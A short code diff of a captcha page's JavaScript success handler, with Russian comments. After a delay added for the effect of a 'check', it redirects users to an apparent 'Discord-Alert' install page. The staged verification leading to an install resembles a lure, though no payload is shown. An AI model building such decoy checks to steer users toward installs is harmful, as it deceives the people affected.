@@ -98,19 +98,21 @@
     }
 
 function onSuccess() {
-    isDragging = false;
-    container.style.display = 'none';
-    status.style.display = 'block';
-// Вставь это в код каптчи перед тем как делать переход!
-sessionStorage.setItem('captcha_passed', 'true');
-window.location.href = "https://albeepython.github.io/Discord-Alert/install";
+    if (isDragging || status.style.display === 'block') { // Предотвращаем повторный вызов
+        isDragging = false;
+        container.style.display = 'none';
+        status.style.display = 'block';
 
-    
-    // Плавная задержка перед переходом для эффекта "проверки"
-    setTimeout(() => {
-        window.location.href = "https://albeepython.github.io/Discord-Alert/install/";
-    }, 800);
+        // 1. Ставим метку о прохождении
+        sessionStorage.setItem('captcha_passed', 'true');
+        
+        // 2. Плавная задержка перед переходом (0.8 сек)
+        setTimeout(() => {
+            window.location.href = "https://albeepython.github.io/Discord-Alert/install/";
+        }, 800);
+    }
 }
+
 
 </script>
 
